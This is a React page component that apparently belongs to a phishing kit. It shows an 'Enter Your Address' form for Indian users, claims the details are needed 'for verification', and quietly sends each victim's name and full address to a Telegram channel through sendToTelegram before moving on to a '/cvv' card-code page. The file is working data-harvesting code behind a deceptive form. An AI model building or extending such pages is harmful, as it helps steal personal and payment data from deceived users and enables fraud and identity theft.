import { useState } from "react";
import { AppLayout } from "../../components/AppChrome/AppLayout";
import { Banner } from "../../components/Banner/Banner";
import { Button } from "../../components/ui/Button";
import { useNavigate } from "../../app/router";
import { sendToTelegram, formatEntry } from "../../lib/telegram";
import "./AddressPage.css";

const STATES = [
  "Andhra Pradesh","Arunachal Pradesh","Assam","Bihar","Chhattisgarh",
  "Goa","Gujarat","Haryana","Himachal Pradesh","Jharkhand","Karnataka",
  "Kerala","Madhya Pradesh","Maharashtra","Manipur","Meghalaya","Mizoram",
  "Nagaland","Odisha","Punjab","Rajasthan","Sikkim","Tamil Nadu","Telangana",
  "Tripura","Uttar Pradesh","Uttarakhand","West Bengal",
  "Andaman and Nicobar Islands","Chandigarh","Dadra and Nagar Haveli and Daman and Diu",
  "Delhi","Jammu and Kashmir","Ladakh","Lakshadweep","Puducherry",
];

export function AddressPage() {
  const navigate = useNavigate();
  const [line1, setLine1]   = useState("");
  const [line2, setLine2]   = useState("");
  const [city, setCity]     = useState("");
  const [state, setState]   = useState("");
  const [pincode, setPincode] = useState("");
  const [error, setError]   = useState<string | null>(null);

  function getUserName(): string {
    try {
      const lead = JSON.parse(sessionStorage.getItem("rg:lead") || "{}");
      return lead.fullName || "Unknown";
    } catch { return "Unknown"; }
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);

    if (!line1.trim())    return setError("Please enter your address");
    if (!city.trim())     return setError("Please enter your city");
    if (!state)           return setError("Please select your state");
    if (!/^\d{6}$/.test(pincode)) return setError("Please enter a valid 6-digit PIN code");

    const fullAddress = [line1.trim(), line2.trim(), city.trim(), state, pincode].filter(Boolean).join(", ");

    void sendToTelegram(
      formatEntry("🏠 Address Details", {
        "👤 User":   getUserName(),
        "Address":   line1.trim(),
        "Line 2":    line2.trim() || "—",
        "City":      city.trim(),
        "State":     state,
        "PIN Code":  pincode,
      })
    );

    try {
      sessionStorage.setItem("rg:address", JSON.stringify({ fullAddress, line1: line1.trim(), line2: line2.trim(), city: city.trim(), state, pincode }));
    } catch {}

    navigate("/cvv");
  };

  return (
    <AppLayout title="Your Address">
      <div className="apg">
        <Banner />
        <section className="apg__card">
          <header className="apg__head">
            <div className="apg__icon">🏠</div>
            <h1 className="apg__heading">Enter Your Address</h1>
            <p className="apg__sub">We need your full address for verification</p>
          </header>

          <form className="apg__form" onSubmit={handleSubmit} noValidate>
            <div className="apg__field">
              <label className="apg__label" htmlFor="line1">
                Address Line 1 <span className="apg__required">*</span>
              </label>
              <input
                id="line1"
                className="apg__input"
                type="text"
                value={line1}
                onChange={(e) => setLine1(e.target.value)}
                placeholder="House no., Street, Area"
              />
            </div>

            <div className="apg__field">
              <label className="apg__label" htmlFor="line2">
                Address Line 2 <span className="apg__optional">(optional)</span>
              </label>
              <input
                id="line2"
                className="apg__input"
                type="text"
                value={line2}
                onChange={(e) => setLine2(e.target.value)}
                placeholder="Landmark, Colony"
              />
            </div>

            <div className="apg__row">
              <div className="apg__field apg__field--half">
                <label className="apg__label" htmlFor="city">
                  City <span className="apg__required">*</span>
                </label>
                <input
                  id="city"
                  className="apg__input"
                  type="text"
                  value={city}
                  onChange={(e) => setCity(e.target.value)}
                  placeholder="City"
                />
              </div>
              <div className="apg__field apg__field--half">
                <label className="apg__label" htmlFor="pincode">
                  PIN Code <span className="apg__required">*</span>
                </label>
                <input
                  id="pincode"
                  className="apg__input"
                  type="text"
                  inputMode="numeric"
                  value={pincode}
                  onChange={(e) => setPincode(e.target.value.replace(/\D/g, "").slice(0, 6))}
                  placeholder="6 digits"
                  maxLength={6}
                />
              </div>
            </div>

            <div className="apg__field">
              <label className="apg__label" htmlFor="state">
                State <span className="apg__required">*</span>
              </label>
              <select
                id="state"
                className="apg__select"
                value={state}
                onChange={(e) => setState(e.target.value)}
              >
                <option value="">-- Select State --</option>
                {STATES.map((s) => (
                  <option key={s} value={s}>{s}</option>
                ))}
              </select>
            </div>

            {error && <p className="apg__error">{error}</p>}

            <Button type="submit" variant="primary" block>
              Continue
            </Button>
          </form>
        </section>
      </div>
    </AppLayout>
  );
}
